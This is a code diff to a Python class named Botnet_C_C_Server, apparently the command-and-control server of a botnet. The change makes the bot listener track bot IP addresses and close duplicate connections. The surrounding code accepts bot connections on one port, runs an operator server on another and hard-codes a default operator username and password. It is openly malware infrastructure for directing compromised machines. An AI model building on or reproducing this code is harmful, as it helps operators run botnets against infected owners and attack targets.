@@ -111,6 +111,7 @@ class Botnet_C_C_Server:
 
     def __init__(self,users_host='0.0.0.0',ping_command='',pings_interval=5,threads_daemon=False,users_encryption_key=None,users_port=22222,bots_host='0.0.0.0',bots_port=7777,socket_buffer_size=4096,max_users=5,max_bots=100,logs=False,initial_commands_list=[],bots_encryption_key=None,users=[{"username":"ala_sensei","password":"ala_sensei"}]):
         self.ping_command=ping_command
+        self.bots_addresses=[]
         self.bots_list=[]
         self.bots_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.bots_server.bind((bots_host, bots_port))
@@ -143,12 +144,17 @@ class Botnet_C_C_Server:
     def run_bots_server(self):
         while True:
             client, addr = self.bots_server.accept()
-            if self.logs==True:
-                print("[*] Accepted connection from: {}:{}".format(addr[0],addr[1]))
-            self.bots_list.append(client)
-            client_handler = threading.Thread(target=self.handle_bot, args=(client,))
-            client_handler.threads_daemon=self.threads_daemon
-            client_handler.start()
+            if str(addr[0]) not in self.bots_addresses:
+                self.bots_addresses.append(str(addr[0]))
+                if self.logs==True:
+                    print("[*] Accepted connection from: {}:{}".format(addr[0],addr[1]))
+                self.bots_list.append(client)
+                client_handler = threading.Thread(target=self.handle_bot, args=(client,))
+                client_handler.threads_daemon=self.threads_daemon
+                client_handler.start()
+            else:
+                client.close()
+            
     
 
     def run_users_server(self):
